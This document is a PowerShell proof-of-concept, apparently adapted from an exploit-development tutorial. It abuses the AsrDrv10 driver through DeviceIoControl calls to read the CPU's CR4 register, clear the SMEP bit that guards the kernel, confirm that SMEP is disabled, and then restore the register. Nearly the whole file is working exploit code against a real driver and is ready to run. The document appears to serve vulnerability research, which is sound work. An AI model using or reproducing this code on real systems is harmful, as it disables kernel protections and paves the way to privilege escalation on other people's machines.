# Based of FuzzeySec example code located at https://www.fuzzysecurity.com/tutorials/expDev/23.html
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class Driver
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        IntPtr OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);
}
"@
 
#----------------[Get Driver Handle]
 
$hDevice = [Driver]::CreateFile("\\.\AsrDrv10", [System.IO.FileAccess]::ReadWrite,
[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
 
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
	"Did you load the AsrDrv10 driver?"
    Return
} else {
    echo "`n[>] Driver access OK.."
    echo "[+] lpFileName: \\.\AsrDrv10"
    echo "[+] Handle: $hDevice"
}
 
#----------------[Prepare buffer & Send IOCTL]

# 0x22286c readcr 
# 170678

Function ReadCR {
    param ( $WhichCR )

    $ReadInBuffer = [System.BitConverter]::GetBytes([Int64]$WhichCR)
    $ReadOutBuffer = [Driver]::VirtualAlloc([System.IntPtr]::Zero, 32, 0x3000, 0x40)

    $IntRet = 0
    $CallResult = [Driver]::DeviceIoControl($hDevice, 0x22286c, $ReadInBuffer, $ReadInBuffer.Length, $ReadOutBuffer, 32, [ref]$IntRet, [System.IntPtr]::Zero)
    if (!$CallResult) {
        echo "`n[!] DeviceIoControl failed..`n"
        Return
    }

#    $WhichCR = [System.Runtime.InteropServices.Marshal]::ReadInt32($ReadOutBuffer.ToInt64())
    $CRValue = [System.Runtime.InteropServices.Marshal]::ReadInt64($ReadOutBuffer.ToInt64()+8)
#    echo "`n[>] Call result:"
#    "Read CR{0:X} = {1:X}" -f $WhichCR, $CRValue

    Return $CRValue
}

#----------------[Read out the result buffer]

Function WriteCR4 {
    param([Int64]$NewCR)

    [byte[]]$WriteInBuffer = @(
    [System.BitConverter]::GetBytes([Int32]0x4) +
    [System.BitConverter]::GetBytes([Int32]0x0) +
    [System.BitConverter]::GetBytes([Int64]$NewCR)
    )
    $WriteOutBuffer = [Driver]::VirtualAlloc([System.IntPtr]::Zero, 32, 0x3000, 0x40)

    "Value to write is {0:X}" -f $NewCR

    echo "IOCTL buffer: "
    ($WriteInBuffer |  foreach { $_.ToString("X2") }) -join ""
    
    $IntRet = 0
    $CallResult = [Driver]::DeviceIoControl($hDevice, 0x222870, $WriteInBuffer, $WriteInBuffer.Length, $WriteOutBuffer, 32, [ref]$IntRet, [System.IntPtr]::Zero)
    if (!$CallResult) {
        echo "`n[!] DeviceIoControl failed..."
        "Error = {0}" -f $CallResult
        "IntRet = {0}" -f $IntRet
        Return
    }
}

# set our processor affinity to make sure we're always scheduled to the same core
$core = 0
$core | select -unique |  %  {$affinity = 0} {$affinity += [math]::pow(2,$_) }
(Get-Process -id $pid).ProcessorAffinity = [int]$affinity 

[Int32]$WhichCR = 0x4

echo "`nReading CR4..."

[Int64]$OldCR4 = ReadCR($WhichCR)[-1]
$SMEPEnabled = [Boolean]($OldCR4 -band (1 -shl 20))

echo "======================"
"CR4 = {0:X}" -f $OldCR4
"CR4.SMEP = {0:X}" -f $SMEPEnabled
echo "======================"

# mask off CR4.SMEP bit
$NewCR4 = $OldCR4 -band (-bnot (1 -shl 20))

echo "`nWriting CR4 back after clearing SMEP bit..."
WriteCR4($NewCR4)

echo "`nReading CR4 to see if we could disable SMEP..."

$NewestCR4 = ReadCR($WhichCR)[-1]
$SMEPEnabled = [Boolean]($NewestCR4 -band (1 -shl 20))

echo "======================"
"CR4 = {0:X}" -f $NewestCR4
"CR4.SMEP = {0:X}" -f $SMEPEnabled
echo "======================"

echo "`nWriting original CR4 back..."
WriteCR4($OldCR4)
